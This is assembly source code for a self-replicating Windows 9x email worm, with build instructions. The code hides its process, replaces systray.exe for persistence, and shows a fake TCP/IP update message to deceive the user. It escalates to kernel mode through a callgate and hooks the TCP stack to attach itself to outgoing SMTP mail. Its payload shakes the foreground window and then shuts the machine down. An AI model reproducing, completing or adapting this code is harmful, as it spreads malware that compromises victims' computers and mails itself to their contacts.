
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[TROODON.ASM]컴�
;	I-Worm.Win9X.Troodon Project
;-----------------------------------------
;  Technical details:
;	This is an Win95/98 specific Internet-Worm, witch spreads trough e-mail.
;	When executed it does more things in ring3 and ring0 too.
;	- ring3 actions -
;		- it looks very similar with a normal Windows application witch has a window etc.
;		So it has a window and a message loop. This is needed by the payload witch will activate
;		on a specific date (check code). When payload is triggered the foreground window on the desktop
;		will start bounce arround on the screen, for 30 seconds then Windows will shutdown.
;		This is the payload part, it will activate only if it is running under the name "systray.exe"
;		- when starting it checks if already installed in the system: checks if it's name is "systray.exe".
;		If not, then it copies itself in System directory under the name "systray.me", by using wininit.ini
;		systray.exe will be replaced by systray.me on next startup, and original systray.exe will be saved
;		in systray.sys.
;		If the name isn't systray.exe then it will show a message to fool the user all is ok.
;		If the name is systray.exe then it will run the saved systray.sys using WinExec and it will assume
;		that it is already installed in the system.
;		- it will encoded current process'es file in base64 and save it in memory allocated with VirtualAlloc
;		- it will check for signature in memory at 0xC000E990
;		If not in memory then it will jump into ring0 by using a callgate method described by Zombie,
;		by patching LDT table.
;
;	- ring0 actions -
;		- it allocates memory in ring0 for it's own code and for encoded file.
;		- it copies itself and the encoded file in there (after jumping back into ring3 the memory used for
;		encoded file will be free.
;		- it will hook TdiConnect, TdiSend, TdiCloseConnection, TdiDisconnect for it's own use.
;		- it will monitor all outgoing connections checking for SMTP (port 25) connections.
;		- when it find one it will wait for DATA command for SMTP server
;		- then it will check the content of the e-mail, if it is a MIME formated e-mail containing
;		text/plain or text/html or both it will modify the message attaching it's own code (encoded in base64)
;		to the mail.
;
;	It has it's own string routines.
;	Things I didn't do in this version are: doesn't attach to mails that already have attachements, and to mails
;	with no MIME content.
;
;
;	This is done using NASM syntax.
;	Compilation and linking:
;		NASMW -f win32 v.asm
;		GORC /r vres.rc
;		ALINK -entry start -oPE v.obj vres.res kernel32.lib user32.lib gdi32.lib


extern ExitProcess
extern RegisterServiceProcess
extern GetModuleHandleA
extern GetModuleFileNameA
extern CopyFileA
extern DeleteFileA
extern WritePrivateProfileStringA
extern WinExec
extern VirtualAlloc
extern VirtualFree
extern CreateFileA
extern GetFileSize
extern CloseHandle
extern CreateFileMappingA
extern MapViewOfFile
extern UnmapViewOfFile
extern MessageBoxA
extern GetForegroundWindow
extern GetWindowRect
extern MoveWindow
extern RegisterClassA
extern CreateWindowExA
extern ShowWindow
extern UpdateWindow
extern GetMessageA
extern TranslateMessage
extern DispatchMessageA
extern PostQuitMessage
extern DefWindowProcA
extern SetTimer
extern GetLocalTime
extern ExitWindowsEx
extern GetSystemDirectoryA
extern lstrcatA

%include "win32n.inc"
%include "vxdn.inc"

@@VTDI_Get_Version		equ		004880000h
@@VTDI_Get_Info			equ		004880008h
ID_TIMER1				equ		100
ID_TIMER2				equ		101
step					equ		2

global start

[bits 32]
[section .text]

start:
%define ebp_hInstance       ebp+8	; handle of current instance
%define ebp_hPrevInstance   ebp+0ch	; handle of previous instance
%define ebp_lpszCmdLine     ebp+10h	; pointer to command line
%define ebp_nCmdShow        ebp+14h	; show state of window

		push ebp
		mov ebp,esp

		;  hide the process even if it stay just a bit in memory,
		;  just to be sure that no quick eye see it
		push	dword 1
		push	dword 0
		call	RegisterServiceProcess

		; get module handle
		push	dword 0
		call	GetModuleHandleA

		; get module file name
		push	dword [path_len]
		push	dword my_path
		push	eax
		call	GetModuleFileNameA

		; make paths; %SYSDIR% + filenames
		call	make_paths

		; Register Window Class
		mov	eax, [ebp_hInstance]
		mov	[WindowClassStruc+WNDCLASS.hInstance], eax
		mov	dword [WindowClassStruc+WNDCLASS.hIcon], 0
		mov	dword [WindowClassStruc+WNDCLASS.hCursor], 0

		push	dword WindowClassStruc
		call	RegisterClassA

		test	eax,eax
		jnz	.Success

.Fail:	jmp	FareWell

.Success:

MakeWindow:	; create the window
		push	dword 0
		push	dword [ebp_hInstance]
		push	dword 0
		push	dword 0
		push	dword 200
		push	dword 200
		push	dword 10
		push	dword 10
		push	dword WS_OVERLAPPEDWINDOW
		push	dword WindowTitle
		push	dword ClassName
		push	dword WS_EX_OVERLAPPEDWINDOW
      	call	CreateWindowExA

		test	eax,eax
		jnz	.Success

.Fail:	jmp	FareWell

.Success:	mov	[WindowHandle], eax
		push	dword SW_HIDE
		push	dword [WindowHandle]
		call	ShowWindow

		push	eax
		call	UpdateWindow
	
MsgLoop:	; the message loop
		push	dword 0
		push	dword 0
		push	dword 0
		push	dword WindowMSG
		call	GetMessageA

		or	eax,eax
		jz	FareWell

		push	dword WindowMSG
		call	TranslateMessage

		push	dword WindowMSG
		call	DispatchMessageA
	
		jmp	MsgLoop

FareWell:	push	dword 0
		call	ExitProcess
		
WndProc:
%define ebp_hWnd   ebp+8		; handle of window
%define ebp_Msg    ebp+0ch		; message
%define ebp_wParam ebp+10h		; first message parameter
%define ebp_lParam ebp+14h		; second message parameter
%define ebp_DC	  ebp-4

		push	ebp
		mov	ebp,esp

		cmp	dword [ebp_Msg], WM_CREATE
		jz	Create_Handler
		cmp	dword [ebp_Msg], WM_TIMER
		jnz	.next_2
		jmp	Timer_Handle
.next_2:	cmp	dword [ebp_Msg], WM_DESTROY
		jnz	.next_1
		jmp	Destroy_Handler
.next_1:

.DefMsgHandler:
		push	dword [ebp_lParam]
		push	dword [ebp_wParam]
		push	dword [ebp_Msg]
		push	dword [ebp_hWnd]
		call	DefWindowProcA

.Exit:	mov	esp,ebp
		pop	ebp
		ret	0x0C

Create_Handler:
		; check if the name of the file is "systray.exe"
		call	check_systray

		; THIS is the call the installs the i-worm "engine" in memory
		call	iworm

		push	dword STime
		call	GetLocalTime

		cmp	byte [systray_ornot], 1		; "myself" is systray.exe
		je	.next_1

		; Get out
		push	dword 0
		call	ExitProcess

.next_1:	; next is for payload
		cmp	word [STime+SYSTEMTIME.wDayOfWeek], 6
		jne	.exit

		push	dword 0
		push	dword 1
		push	dword ID_TIMER1
		push	dword [ebp_hWnd]
		call	SetTimer

		push	dword 0
		push	dword 300000
		push	dword ID_TIMER2
		push	dword [ebp_hWnd]
		call	SetTimer

.exit:	jmp	WndProc.Exit

Timer_Handle:
		; this is for payload again
		cmp	dword [ebp_wParam], ID_TIMER1
		jnz	.next_1
		jmp	.timer_1
.next_1:	cmp	dword [ebp_wParam], ID_TIMER2
		jnz	.next_2
		jmp	.timer_2
.next_2:	jmp	WndProc.Exit

.timer_1:	; get forground window
		call	GetForegroundWindow
		mov	dword [hWnd], eax

		; "Restore" window
		push	dword SW_RESTORE
		push	eax
		call	ShowWindow

		; get window position and size
		push	dword rect
		push	dword [hWnd]
		call	GetWindowRect

		; move it
		push	dword 1
		mov	eax, [rect+RECT.bottom]
		sub	eax, [rect+RECT.top]
		push	eax
		mov	eax, [rect+RECT.right]
		sub	eax, [rect+RECT.left]
		push	eax
		mov	eax, [rect+RECT.top]
		add	eax, [y]
		push	eax
		mov	eax, [rect+RECT.left]
		add	eax, [x]
		push	eax
		push	dword [hWnd]
		call	MoveWindow

		mov	eax, [rect+RECT.right]
		cmp	eax, 1014
		jg	.dec_x
		mov	eax, [rect+RECT.left]
		cmp	eax, 10
		jb	.inc_x
		jmp	.done_x
.dec_x:	mov	dword [x], -step
		jmp	.done_x
.inc_x:	mov	dword [x], step
.done_x:

		mov	eax, [rect+RECT.bottom]
		cmp	eax, 758
		jg	.dec_y
		mov	eax, [rect+RECT.top]
		cmp	eax, 10
		jb	.inc_y
		jmp	.done_y
.dec_y:	mov	dword [y], -step
		jmp	.done_y
.inc_y:	mov	dword [y], step
.done_y:	jmp	WndProc.Exit

.timer_2:	push	dword 0
		push	dword EWX_SHUTDOWN
		call	ExitWindowsEx

		jmp	WndProc.Exit


Destroy_Handler:
		push	dword 0
		call	PostQuitMessage
		jmp	WndProc.Exit

		jmp WndProc.DefMsgHandler




;------------------------------------------------------------
;  Here starts the part witch makes this an I-Worm
;------------------------------------------------------------
iworm:	pushad

		; encode in base64 the file
		mov	esi, my_path
		call	encode

		cmp	byte [systray_ornot], 1
		jne	.not_systray
		jmp	.systray

.not_systray:	; it isn't installed in the system, so install it
		; copy myself into 'systray.me'
		push	dword 0
		push	dword systray.me
		push	dword my_path
		call	CopyFileA

		; write wininit.ini, so next time windows will start it will
		; rename systray.exe into systray.sys and systray.me into systray.exe
		push	dword wininit.ini
		push	dword systray.exe
		push	dword systray.sys
		push	dword rename
		call	WritePrivateProfileStringA

		push	dword wininit.ini
		push	dword systray.me
		push	dword systray.exe
		push	dword rename
		call	WritePrivateProfileStringA

		push	dword 0x00000030
		push	dword msgCaption
		push	dword msgContent
		push	dword 0
		call	MessageBoxA
		jmp	.systray_over

.systray:	; run the original systray.exe (systray.sys)
		push	dword 0
		push	dword systray.sys
		call	WinExec

.systray_over:
		;  signature
		mov	eax, 0xC000E990			; check if already there
        	cmp	dword [eax], 'WORM'

		;  if not resident, goto not_res
        	jne	not_res

		;  else get out
		jmp	out_of_here

not_res:	;  jump into ring0

		mov	esi, Ring0Proc
		call	callgate

		; free the allocated mem
		call	close_encode

out_of_here:; job done, time to let it go
		popad
		ret

;------------------------------------------------------------
;  Ring0Proc
;------------------------------------------------------------
Ring0Proc	pushf
		pushad

		; calculate code size
		mov	eax, end
		sub	eax, start
		add	eax, 0x100
		mov	[codesize], eax

		; alloc mem for encoded file
		VxDCall _HeapAllocate, dword [encoded_size], dword HEAPZEROINIT
		mov	[heap_enc_addr], eax

		; copy it there
		mov	esi, dword [encoded_addr]
		mov	edi, eax
		mov	ecx, dword [encoded_size]
		repz	movsb

		; alloc some memory
		VxDCall	IFSMgr_GetHeap, dword [codesize]
		mov	[codeaddr], eax

		; copy the code
		mov	esi, start
		mov	edi, eax
		mov	ecx, [codesize]
		repz	movsb

		; make the hooks and stay in there
		mov	eax, [codeaddr]
		add	eax, heap_code - start
		call	eax

.exit:	; time to say good bye
		popad
		popf
		retf


;------------------------------------------------------------
;  This code will be executed only in heap
;------------------------------------------------------------
heap_code:	pushf
		pushad

		mov	eax, 0xC000E990			; mark "already there"
        	mov	dword [eax], 'WORM'
		call	TdiHook

		popad
		popf
		ret


;------------------------------------------------------------
;  TdiHook
;------------------------------------------------------------
TdiHook:	; now i need to hook the TDI functions i need
		pushad

		mov	ebp, [codeaddr]
		sub	ebp, start

		; Make sure VTDI is present
		VxDCall	VTDI_Get_Version
		jnc	.cont_1
		jmp	.exit
.cont_1:

		; Get a pointer to TCP dispatch table
		lea	eax, [ebp + TCPName]
		push	eax
		VxDCall VTDI_Get_Info
		add	esp, 4

		; Save the address of dispatch table
		lea	esi, [ebp + TdiDispatchTable]
		mov	[esi], eax
		cmp	eax, 0
		; if error get out
		jne	.cont_2
		jmp	.exit
.cont_2:

		; ---------- Hook TdiConnect ----------
		mov	ebx, [eax + 0x18]
		lea	esi, [ebp + TdiConnect_PrevAddr]
		mov	[esi], ebx

		; patch some things in it
		lea	edi, [ebp + TdiConnect_Jmp]
		mov	[edi], esi

		lea	edi, [ebp + TdiConnect_Delta]
		mov	esi, [codeaddr]
		mov	[edi], esi

		lea	ebx, [ebp + TdiConnect_Hook]
		mov	[eax + 0x18], ebx

		; ---------- Hook TdiSend ----------
		mov	ebx, [eax + 0x2C]
		lea	esi, [ebp + TdiSend_PrevAddr]
		mov	[esi], ebx

		; patch some things in it
		lea	edi, [ebp + TdiSend_Jmp]
		mov	[edi], esi

		lea	edi, [ebp + TdiSend_Delta]
		mov	esi, [codeaddr]
		mov	[edi], esi

		lea	ebx, [ebp + TdiSend_Hook]
		mov	[eax + 0x2C], ebx

		; ---------- Hook TdiDisconnect ----------
		mov	ebx, [eax + 0x1C]
		lea	esi, [ebp + TdiDisconnect_PrevAddr]
		mov	[esi], ebx

		; patch some things in it
		lea	edi, [ebp + TdiDisconnect_Jmp]
		mov	[edi], esi

		lea	edi, [ebp + TdiDisconnect_Delta]
		mov	esi, [codeaddr]
		mov	[edi], esi

		lea	ebx, [ebp + TdiDisconnect_Hook]
		mov	[eax + 0x1C], ebx

		; ---------- Hook TdiCloseConnection ----------
		mov	ebx, [eax + 0x0C]
		lea	esi, [ebp + TdiCloseConnection_PrevAddr]
		mov	[esi], ebx

		; patch some things in it
		lea	edi, [ebp + TdiCloseConnection_Jmp]
		mov	[edi], esi

		lea	edi, [ebp + TdiCloseConnection_Delta]
		mov	esi, [codeaddr]
		mov	[edi], esi

		lea	ebx, [ebp + TdiCloseConnection_Hook]
		mov	[eax + 0x0C], ebx

.exit:		popad
		ret

;------------------------------------------------------------
;  TdiConnect_Hook
;------------------------------------------------------------
TdiConnect_Hook:; MOV	EDI, <address_of_code_in_heap>
		db	0xBF
TdiConnect_Delta:dd	0
		sub	edi, start

		push	ebp
		mov	ebp, esp

		pushf
		pushad

		mov	esi, [ebp + 0x10]		; esi = *RequestAddr
		mov	esi, [esi + 0x14]		; esi = *RemoteAddr
		cmp	word [esi + 0x06], 2		; TDI_ADDRESS_TYPE_IP
		jne	TdiConnect_Hook_Jmp

		;  check if the connection is to an SMTP server
		mov	ax, word [esi + 0x08]
		cmp	ax, 0x1900			; smtp ?
		je	.smtp_on

		;  if not, get out
		jmp	TdiConnect_Hook_Jmp

.smtp_on:	;mov	byte [edi + Trace], 1
		mov	eax, [ebp + 0x08]
		mov	eax, [eax]
		mov	dword [edi + TraceHandle], eax

TdiConnect_Hook_Jmp:
		popad
		popf

		pop	ebp

;		jmp	[TdiConnect_Jmp]
		db	0xFF, 0x25
TdiConnect_Jmp:	dd	0


;------------------------------------------------------------
;  TdiSend_Hook
;------------------------------------------------------------
TdiSend_Hook:
		push	ebp
		mov	ebp, esp

		pushf
		pushad

		; MOV	EDI, <address_of_code_in_heap>
		db	0xBF
TdiSend_Delta:	dd	0
		sub	edi, start

		; check if we trace the correct connection
		mov	eax, [ebp + 0x08]
		mov	eax, [eax]
		cmp	[edi + TraceHandle], eax
		je	.jump_over
		jmp	.exit
.jump_over:
		; so we are tracing our SMTP connection
		; get the buffer length and address

		mov	ebx, [ebp + 0x10]
		mov	eax, [ebp + 0x14]		; eax = *SendBuffer
		mov	esi, [eax + 0x04]		; esi = source buffer
		mov	ecx, [eax + 0x0C]		; ecx = length
		mov	[edi + sourcebuf], esi
		mov	[edi + buflen], ecx

		; check NextIsMail flag
		cmp	byte [edi + NextIsMail], 1
		je	.Mail

		lea	edx, [edi + search_str]
		call	strncmpi

		test	eax, eax
		je	.pass_1
		jmp	.exit
.pass_1:
		; set NextIsMail flag
		;	This flag is set when the DATA instruction for SMTP server is sent.
		;	DATA command is sent before sending the mail body.
		mov	byte [edi + NextIsMail], 1

		jmp	.exit

.Mail:	; reset NextIsMail flag
		mov	byte [edi + NextIsMail], 0

		; search in the mail for "Content-Type" string
		; ESI = buffer source
		; ECX = buffer length

		lea	edx, [edi + strContentType]
		push	esi				; save ESI
		push	edx				;
		pop	esi				; ESI = EDX
		call	strlen
		pop	esi				; restore ESI
		push	eax				;
		pop	ecx				; ECX = EAX

		mov	ebx, [edi + buflen]
.next:	call	strncmpi
		test	eax, eax
		jz	.found_1
		inc	esi
		dec	ebx
		test	ebx, ebx
		jz	.not_found_1
		jmp	.next

.not_found_1:
		jmp	.exit

.found_1:	mov	[edi + mark1], esi		; save the position of "Content-Type" witch is the begin of the text mail

		add	esi, ecx
		cmp	byte [esi], ' '
		jne	.pass_2
		inc	esi

.pass_2:	; ESI points after "Content-Type:"
		; check if Content-Type is text/plain -> this mean the e-mail is a simple text mail
		lea	edx, [edi + strTextPlain]
		push	esi
		push	edx
		pop	esi
		call	strlen
		push	eax
		pop	ecx
		pop	esi

		call	strncmpi
		test	eax, eax
		jne	.not_textplain
		mov	byte [edi + mailtype], 1	; text/plain
		jmp	.go_for_it

.not_textplain:
		lea	edx, [edi + strMultipartAlternative]
		push	esi
		push	edx
		pop	esi
		call	strlen
		push	eax
		pop	ecx
		pop	esi

		call	strncmpi
		test	eax, eax
		jne	.not_multipartalternative
		mov	byte [edi + mailtype], 2		; text/plain + text/html
		jmp	.go_for_it

.not_multipartalternative:
		lea	edx, [edi + strMultipartMixed]
		push	esi
		push	edx
		pop	esi
		call	strlen
		push	eax
		pop	ecx
		pop	esi

		call	strncmpi
		test	eax, eax
		jne	.not_multipartmixed
		mov	byte [edi + mailtype], 3		; text + probably attachement
;		jmp	.go_for_it
.not_multipartmixed:
		jmp	.exit

.go_for_it:	; EIP reached here if the e-mail is text/plain
		; find the end of mail and save it
		mov	esi, [edi + sourcebuf]
.again_1:	cmp	byte [esi], 0
		je	.found_2
		inc	esi
		jmp	.again_1
.found_2:	mov	[edi + mark2], esi

		; Get some memory for the new e-mail
		mov	ecx, [edi + buflen]
;		add	ecx, [edi + newmaillen]
		add	ecx, 15000
		VMMcall _HeapAllocate, ecx, dword HEAPZEROINIT
		test	eax, eax
		jnz	.pass_3
		jmp	.exit
.pass_3:	mov	[edi + newmailaddr], eax

		; copy until original "Content-Type"
		mov	esi, [edi + sourcebuf]
		mov	edx, eax
		mov	ecx, [edi + mark1]
		sub	ecx, esi
		call	strncpy
		add	edx, ecx

		; copy my multipart/mixed header
		lea	esi, [edi + myMultipartMixed]
		call	strlen
		mov	ecx, eax
		call	strncpy
		add	edx, ecx

		; copy my boundary name
		lea	esi, [edi + myBoundary]
		call	strlen
		mov	ecx, eax
		call	strncpy
		add	edx, ecx

		; copy my used boundary name
		lea	esi, [edi + myUseBoundary]
		call	strlen
		mov	ecx, eax
		call	strncpy
		add	edx, ecx

		; copy original mail
		mov	esi, [edi + mark1]
		mov	ecx, [edi + mark2]
		sub	ecx, esi
		call	strncpy
		add	edx, ecx

		; copy my used boundary name
		lea	esi, [edi + myUseBoundary]
		call	strlen
		mov	ecx, eax
		call	strncpy
		add	edx, ecx

		; copy attachement header
		lea	esi, [edi + myAttachHeader]
		call	strlen
		mov	ecx, eax
		call	strncpy
		add	edx, ecx

		; base64 encoded file copy
		mov	esi, [edi + heap_enc_addr]
		mov	ecx, [edi + encoded_size]
		call	strncpy
		add	edx, ecx

		; close boundary
		lea	esi, [edi + myEndBoundary]
		call	strlen
		mov	ecx, eax
		call	strncpy

		; set new source buffer address
		mov	esi, [ebp + 0x14]		; eax = *SendBuffer
		mov	eax, [edi + newmailaddr]
		mov	[esi + 0x04], eax		; source buffer
		; set new buffer length
		push	esi
		mov	esi, [edi + newmailaddr]
		call	strlen
		pop	esi

		mov	ebx, esi
		add	ebx, eax
		cmp	byte [ebx], 0
		jne	.set_len
		dec	eax
.set_len:	mov	[esi + 0x0C], eax		; buffer length
		mov	[ebp + 0x10], eax		; buffer length

.exit:	popad
		popf

		pop	ebp

;		jmp	[TdiSend_Jmp]
		db	0xFF, 0x25
TdiSend_Jmp	dd	0


;------------------------------------------------------------
;  TdiDisconnect_Hook
;------------------------------------------------------------
TdiDisconnect_Hook:
		push	ebp
		mov	ebp, esp

		pushf
		pushad

		; MOV	EDI, <address_of_code_in_heap>
		db	0xBF
TdiDisconnect_Delta:
		dd	0
		sub	edi, start

		; check if disconnecting our connection
		mov	eax, [edi + TraceHandle]
		cmp	[ebp + 0x08], eax
		jne	.exit

		; free the memory
		mov	eax, [edi + newmailaddr]
		VMMcall _HeapFree, eax, dword 0

.exit:	popad
		popf

		pop	ebp

;		jmp	[TdiDisconnect_Jmp]
		db	0xFF, 0x25
TdiDisconnect_Jmp:dd	0


;------------------------------------------------------------
;  TdiCloseConnection_Hook
;------------------------------------------------------------
TdiCloseConnection_Hook:
		push	ebp
		mov	ebp, esp

		pushf
		pushad

		; MOV	EDI, <address_of_code_in_heap>
		db	0xBF
TdiCloseConnection_Delta:
		dd	0
		sub	edi, start

		; check if closing our connection
		mov	eax, [edi + TraceHandle]
		cmp	[ebp + 0x08], eax
		jne	.exit

		; free the memory
		mov     eax, dword [edi + newmailaddr]
		VMMcall _HeapFree, eax, dword 0

.exit:	popad
		popf

		pop	ebp

;		jmp	[TdiCloseConnection_Jmp]
		db	0xFF, 0x25
TdiCloseConnection_Jmp:
		dd	0


;------------------------------------------------------------
;  String comparation non case sensitive
;------------------------------------------------------------
;  Params:
;	ESI = source
;	EDX = destination
;	ECX = length
;  Return:
;	EAX = 0 if strings match
;	EAX = 1 if not match
;------------------------------------------------------------
strncmpi:	pushf
		pushad

.loop:	mov	ah, byte [esi]
		mov	al, byte [edx]
		
		; if Caps Lock the make it non Caps
		cmp	ah, 0x41		; 'A'
		jge	.great_then_A
		jmp	.done_with_1
.great_then_A:
		cmp	ah, 0x5A		; 'Z'
		jbe	.less_then_Z
		jmp	.done_with_1
.less_then_Z:
		add	ah, 0x20

.done_with_1:
		; if Caps Lock the make it non Caps
		cmp	al, 0x41		; 'A'
		jge	.great_then_A_2
		jmp	.done
.great_then_A_2:
		cmp	al, 0x5A		; 'Z'
		jbe	.less_then_Z_2
		jmp	.done
.less_then_Z_2:
		add	al, 0x20

.done:	; now it should be lower case
		cmp	ah, al
		jne	.not_match

		inc	esi
		inc	edx
		loop	.loop

		; if we are here then the strings are identical
		popad
		popf
		xor	eax, eax
		jmp	.exit

.not_match:	; if we are here then the strings are not identical
		popad
		popf
		mov	eax, 1
.exit:	ret


;------------------------------------------------------------
;  String length
;------------------------------------------------------------
;  Params:
;	ESI = source
;  Return:
;	EAX = length
;------------------------------------------------------------
strlen:	push	ebx
		push	ecx
		push	edx
		push	esi
		push	edi
		push	ebp

		xor	ecx, ecx
.not_zero:	mov	al, byte [esi]
		cmp	al, 0
		je	.exit
		inc	esi
		inc	ecx
		jmp	.not_zero
.exit:	mov	eax, ecx

		pop	ebp
		pop	edi
		pop	esi
		pop	edx
		pop	ecx
		pop	ebx
		ret


;------------------------------------------------------------
;  String copy (length specified)
;------------------------------------------------------------
;  Params:
;	ESI = source
;	EDX = destination
;	ECX = length
;------------------------------------------------------------
strncpy:	pushf
		pushad
		cld
		mov	edi, edx
		repz	movsb
.exit:	popad
		popf
		ret


;------------------------------------------------------------
;  Encode in base64 the file
;------------------------------------------------------------
;  Params:
;	ESI = source filename
;  Return:
;	EAX = address of encoded buffer
;	ECX = size of encoded file
;------------------------------------------------------------
encode:	pushad

		; copy it, so we have read-write access
		; (if the program is started then we have readonly access)
		push	dword 0
		push	dword tempFileName
		push	esi
		call	CopyFileA
		mov	esi, tempFileName

		; open file
		push  dword 0
		push  dword 0
		push  dword 3
		push  dword 0
		push  dword 1
		push  dword 0xC0000000		; GENERIC_READ | GENERIC_WRITE
		push  esi
		call	CreateFileA
		mov	dword [hFile], eax

		; get file size
		push	dword 0
		push	eax
		call	GetFileSize
		mov	dword [dwFileSize], eax

		; pad the file with [0,2] zeroes
		; add [0,2] to file size
		xor	edx, edx
		mov	ebx, 0x00000003
		div	ebx

		; remainder 0 ? (div by 3?)
		mov	dword [pad_no], 0
		test	edx, edx
		je	.size_ok

		mov	dword [pad_no], edx
		add	dword [dwFileSize], edx

		; dwBufSize = dwFileSize * 3 (base64 may be 3 times bigger then the original)
		mov	eax, [dwFileSize]
		mov	edx, 0x00000003
		mul	edx
		mov	dword [dwBufSize], eax
		jmp	.fixed_size

.size_ok:	mov	eax, [dwFileSize]
		mov	edx, 0x00000003
		mul	edx
		mov	dword [dwBufSize], eax

.fixed_size:	; alloc some memory
		push	dword 0x00000004
		push	dword 0x00001000
		push	dword [dwBufSize]
		push	dword 0x00000000
		call	VirtualAlloc
                test    eax, eax
		jne	.pass_1
		jmp	.exit
.pass_1:	mov	dword [encoded_addr], eax

		; create file mapping
		push	dword 0
		push	dword [dwFileSize]
		push	dword 0
		push	dword 0x00000004		; PAGE_READWRITE
		push	dword 0
		push	dword [hFile]
		call	CreateFileMappingA
		mov	dword [hMap], eax

		; map view of file
		push	dword [dwFileSize]
		push	dword 0
		push	dword 0
		push	dword 0x00000002		; FILE_MAP_WRITE
		push	eax
		call	MapViewOfFile
		mov	dword [pMap], eax

		mov	ecx, dword [pad_no]
		test	ecx, ecx
		je	.size_ok_2

		mov	esi, eax
		add	esi, dword [dwFileSize]
		sub	esi, ecx

.loop_2:	mov	byte [esi], '0'
		dec	ecx
		test	ecx, ecx
		jne	.loop_2

.size_ok_2:	; start encoding
		mov	eax, dword [pMap]
		mov	edx, dword [encoded_addr]
		mov	ecx, dword [dwFileSize]
		add	ecx, dword [pad_no]

		xor	esi, esi
		mov	edi, encTable

.loop:	xor	ebx, ebx
		mov	bl, byte [eax]
		shr	bl, 2
		and	bl, 00111111b
		mov	bh, byte [edi + ebx]
		mov	byte [edx + esi], bh
		inc	esi

		mov	bx, word [eax]
		xchg	bl, bh
		shr	bx, 4
		mov	bh, 0
		and	bl, 00111111b
		mov	bh, byte [edi + ebx]
		mov	byte [edx + esi], bh
		inc	esi

		inc	eax
		mov	bx, word [eax]
		xchg	bl, bh
		shr	bx, 6
		mov	bh, 0
		and	bl, 00111111b
		mov	bh, byte [edi + ebx]
		mov	byte [edx + esi], bh
		inc	esi

		inc	eax
		xor	ebx, ebx
		mov	bl, byte [eax]
		and	bl, 00111111b
		mov	bh, byte [edi + ebx]
		mov	byte [edx + esi], bh
		inc	esi
		inc	eax

		sub	ecx, 3
		cmp	ecx, 0
		jne	.loop

		mov	dword [encoded_size], esi

		push	dword [pMap]
		call	UnmapViewOfFile

		push	dword [hMap]
		call	CloseHandle

		push	dword [hFile]
		call	CloseHandle

.exit:	push	dword tempFileName
		call	DeleteFileA

		popad
		mov	eax, dword [encoded_addr]
		mov	ecx, dword [encoded_size]
		ret


;------------------------------------------------------------
;  Close encode (free allocated memory)
;------------------------------------------------------------
close_encode:	pushad
		push	dword [encoded_addr]
		push	dword 0x00000000
		push	dword 0x00008000
		call	VirtualFree
		popad
		ret


;------------------------------------------------------------
;  Ring 0 Callgate
;------------------------------------------------------------

CGS		equ 8

callgate:	pushad
		push	ebx
		sgdt	[esp - 0x02]
		pop	ebx
		xor	eax, eax
		sldt	ax
		and	al, 0xF8

		add	ebx, eax

		mov	ch, byte [ebx + 0x07]
		mov	cl, byte [ebx + 0x04]
		shl	ecx, 0x10
		mov	cx, word [ebx + 0x02]

		lea	edi, [ecx + CGS]
		cld

		mov	eax, esi
		stosw
		mov	eax, 0xEC000028
		stosd
		shld	eax, esi, 0x10
		stosw

		popad

		db	0x9A		; call 28:<esi>
		dd	0		; unused
		dw	CGS+100b+11b	; LDT+R3

		ret


;------------------------------------------------------------
;  Check if systray
;------------------------------------------------------------
check_systray:
		pushad

		; check if in the name already exists 'systray.exe' witch means
		; it is already installed in the system
		mov	esi, my_path
		mov	edx, systray_exe
		mov	ecx, dword [systray_exe_len]
		mov	ebx, 300
		sub	ebx, dword [systray_exe_len]

.systray_again:
		call	strncmpi
		dec	ebx
		test	ebx, ebx
		je	.not_systray
		inc	esi
		test	eax, eax
		jne	.systray_again
		jmp	.systray

.not_systray:
		popad
		mov	byte [systray_ornot], 0
		ret

.systray:	popad
		mov	byte [systray_ornot], 1
		ret


;------------------------------------------------------------
;  Make paths for use in installation etc.
;------------------------------------------------------------
make_paths:	pushad
		push	dword 260
		push	dword systray.exe
		call	GetSystemDirectoryA

		push	dword 260
		push	dword systray.sys
		call	GetSystemDirectoryA

		push	dword 260
		push	dword systray.me
		call	GetSystemDirectoryA

		push	dword systray.exe_
		push	dword systray.exe
		call	lstrcatA

		push	dword systray.sys_
		push	dword systray.sys
		call	lstrcatA

		push	dword systray.me_
		push	dword systray.me
		call	lstrcatA

		popad
		ret





;beep:		pushad
;		mov	ax, 1000
;		mov	bx, 200
;		mov	cx, ax
;		mov	al, 0xB6
;		out	0x43, al
;		mov	dx, 0x0012
;		mov	ax, 0x34DC
;		div	cx
;		out	0x42, al
;		mov	al, ah
;		out	0x42, al
;		in	al, 0x61
;		mov	ah, al
;		or	al, 0x03
;		out	0x61, al
;l1:		mov	ecx, 4680
;l2:		loop	l2
;		dec	bx
;		jnz	l1
;		mov	al, ah
;		out	0x61, al
;
;		popad
;		ret

[section .data]
my_path			times	300 db 0
path_len			dd	300
systray.exe			times	260 db 0
systray.exe_		db	'\systray.exe', 0
systray.sys			times	260 db 0
systray.sys_		db	'\systray.sys', 0
systray.me			times	260 db 0
systray.me_			db	'\systray.me', 0
wininit.ini			db	'wininit.ini', 0
rename			db	'Rename', 0
systray_exe			db	'SYSTRAY.EXE', 0
systray_exe_len		dd	11			; size of the string above
tempFileName		db	'\systray.tmp', 0
systray_ornot		db	0	; 0 - "myself" isn't systray.exe :)
						; 1 - "myself" is systray.exe :)

msgCaption			db	'Windows TCP/IP Update', 0
msgContent			db	"The system doesn't need an update.", 13, 10
				db	'Latest version of TCP/IP already present.', 0

hFile				dd	0
hMap				dd	0
pMap				dd	0
dwFileSize			dd	0
dwBufSize			dd	0
encoded_addr		dd	0
heap_enc_addr		dd	0
encoded_size		dd	0
encTable			db      'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
pad				db      '='
pad_no			dd	0
mailtype			db	0

codeaddr			dd	0
codesize			dd	0

TCPName			db	'MSTCP', 0
TdiDispatchTable		dd	0
TdiConnect_PrevAddr	dd	0
TdiSend_PrevAddr		dd	0
TdiDisconnect_PrevAddr	dd	0
TdiCloseConnection_PrevAddr	dd	0
TraceHandle			dd	0
NextIsMail			db	0
sourcebuf			dd	0
buflen				dd	0
search_str			db	'DATA', 0x0D, 0x0A, 0
newmailaddr			dd	0
;newmaillen			dd	0

strContentType		db	'Content-Type:', 0
strMultipartAlternative	db	'multipart/alternative', 0
strMultipartMixed		db	'multipart/mixed', 0
strTextPlain		db	'text/plain', 0
strTextHtml			db	'text/html', 0
strApp			db	'application/x-msdownload', 0

mark1				dd	0
mark2				dd	0

